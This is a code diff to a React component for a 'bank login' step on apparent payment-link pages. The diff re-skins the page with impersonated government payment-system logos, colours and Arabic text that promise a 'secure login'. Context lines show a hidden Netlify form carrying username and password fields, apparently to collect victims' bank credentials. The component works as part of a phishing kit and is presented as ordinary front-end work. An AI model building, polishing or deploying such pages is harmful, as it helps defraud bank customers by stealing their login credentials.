@@ -3,8 +3,10 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
+import { Card } from "@/components/ui/card";
+import { Badge } from "@/components/ui/badge";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -46,6 +48,9 @@ const PaymentBankLogin = () => {
 
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
+  
+  // Get government payment system for branding
+  const govSystem = getGovernmentPaymentSystem(selectedCountry);
 
   const shippingInfo = linkData?.payload as any;
 
@@ -261,55 +266,94 @@ const PaymentBankLogin = () => {
   };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
-      description="أدخل بيانات الدخول للبنك لتأكيد العملية"
-      icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
-      {/* Bank Info Header */}
-      <div 
-        className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
-        style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
-        }}
-      >
-        <div 
-          className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
-        >
-          <Building2 className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
-        </div>
-        <div className="flex-1 text-white">
-          <p className="text-xs sm:text-sm opacity-90">البنك المختار</p>
-          <p className="text-lg sm:text-xl font-bold">{selectedBank?.nameAr || 'البنك'}</p>
-          <p className="text-xs opacity-80">{selectedBank?.name}</p>
-        </div>
-        {selectedCountryData && (
-          <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
-        )}
-      </div>
+    <div className="min-h-screen py-4 sm:py-8" dir="rtl" style={{ background: govSystem.colors.surface }}>
+      <div className="container mx-auto px-3 sm:px-4">
+        <div className="max-w-md mx-auto">
+          {/* Government System Header */}
+          <div className="text-center mb-6">
+            <Badge 
+              className="text-sm px-4 py-2 mb-4 inline-flex items-center gap-2"
+              style={{
+                background: govSystem.gradients.primary,
+                color: govSystem.colors.textOnPrimary,
+              }}
+            >
+              <Lock className="w-4 h-4 ml-2" />
+              {govSystem.logo ? (
+                <img 
+                  src={govSystem.logo} 
+                  alt={govSystem.nameAr}
+                  className="h-6 w-auto object-contain"
+                  style={{ filter: 'brightness(0) invert(1)' }}
+                />
+              ) : (
+                <span style={{ fontFamily: govSystem.fonts.primaryAr }}>{govSystem.nameAr}</span>
+              )}
+            </Badge>
+            <h1 
+              className="text-2xl font-bold mb-2"
+              style={{ color: govSystem.colors.text, fontFamily: govSystem.fonts.primaryAr }}
+            >
+              تسجيل الدخول البنكي
+            </h1>
+            <p 
+              className="text-sm"
+              style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
+            >
+              {govSystem.description}
+            </p>
+          </div>
 
-      {/* Security Notice */}
-      <div 
-        className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
-        style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
-        }}
-      >
-        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
-        <div className="text-xs sm:text-sm">
-          <p className="font-semibold mb-1">تسجيل دخول آمن</p>
-          <p className="text-muted-foreground">
-            سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
-          </p>
-        </div>
-      </div>
+          <Card 
+            className="p-6 shadow-lg border-0"
+            style={{ 
+              boxShadow: govSystem.shadows.lg,
+              borderRadius: govSystem.borderRadius.lg
+            }}
+          >
+            {/* Bank Info Header */}
+            <div 
+              className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
+              style={{
+                background: selectedBank?.color ? `linear-gradient(135deg, ${selectedBank.color}, ${selectedBank.color}dd)` : govSystem.gradients.primary,
+                borderRadius: govSystem.borderRadius.md
+              }}
+            >
+              <div 
+                className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
+              >
+                <Building2 className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
+              </div>
+              <div className="flex-1 text-white">
+                <p className="text-xs sm:text-sm opacity-90" style={{ fontFamily: govSystem.fonts.primaryAr }}>البنك المختار</p>
+                <p className="text-lg sm:text-xl font-bold" style={{ fontFamily: govSystem.fonts.primaryAr }}>{selectedBank?.nameAr || 'البنك'}</p>
+                <p className="text-xs opacity-80">{selectedBank?.name}</p>
+              </div>
+              {selectedCountryData && (
+                <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
+              )}
+            </div>
 
-      {/* Login Form */}
-      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
+            {/* Security Notice */}
+            <div 
+              className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
+              style={{
+                background: `${govSystem.colors.primary}10`,
+                border: `1px solid ${govSystem.colors.primary}30`,
+                borderRadius: govSystem.borderRadius.md
+              }}
+            >
+              <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: govSystem.colors.primary }} />
+              <div className="text-xs sm:text-sm">
+                <p className="font-semibold mb-1" style={{ fontFamily: govSystem.fonts.primaryAr, color: govSystem.colors.text }}>تسجيل دخول آمن</p>
+                <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
+                  سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
+                </p>
+              </div>
+            </div>
+
+            {/* Login Form */}
+            <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
         {/* Username Login */}
         {loginType === 'username' && (
           <>
@@ -415,7 +459,10 @@ const PaymentBankLogin = () => {
           className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
           disabled={isSubmitting}
           style={{
-            background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`
+            background: govSystem.gradients.primary,
+            fontFamily: govSystem.fonts.primaryAr,
+            borderRadius: govSystem.borderRadius.md,
+            boxShadow: govSystem.shadows.md
           }}
         >
           {isSubmitting ? (
@@ -423,20 +470,23 @@ const PaymentBankLogin = () => {
           ) : (
             <>
               <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
-              <span>تسجيل الدخول والمتابعة</span>
+              <span>تسجيل الدخول - {govSystem.nameAr}</span>
               <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
             </>
           )}
         </Button>
         
-        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-          بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
+        <p 
+          className="text-[10px] sm:text-xs text-center mt-3 sm:mt-4"
+          style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
+        >
+          بتسجيل الدخول عبر {govSystem.nameAr}، أنت توافق على شروط وأحكام البنك
         </p>
       </form>
       
       {/* Additional Info */}
-      <div className="mt-6 pt-6 border-t text-center">
-        <p className="text-xs text-muted-foreground mb-3">
+      <div className="mt-6 pt-6 border-t text-center" style={{ borderColor: govSystem.colors.border }}>
+        <p className="text-xs mb-3" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
           لا تملك حساب؟
         </p>
         <Button
@@ -444,12 +494,17 @@ const PaymentBankLogin = () => {
           variant="outline"
           size="sm"
           className="text-xs"
-          style={{ borderColor: selectedBank?.color || branding.colors.primary }}
+          style={{ 
+            borderColor: govSystem.colors.primary,
+            color: govSystem.colors.primary,
+            fontFamily: govSystem.fonts.primaryAr
+          }}
         >
           تسجيل حساب جديد
         </Button>
       </div>
-    
+      </Card>
+
       {/* Hidden Netlify Form */}
       <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
         <input type="text" name="name" />
@@ -467,7 +522,9 @@ const PaymentBankLogin = () => {
         <input type="password" name="password" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+      </div>
+    </div>
+  </div>
   );
 };
 
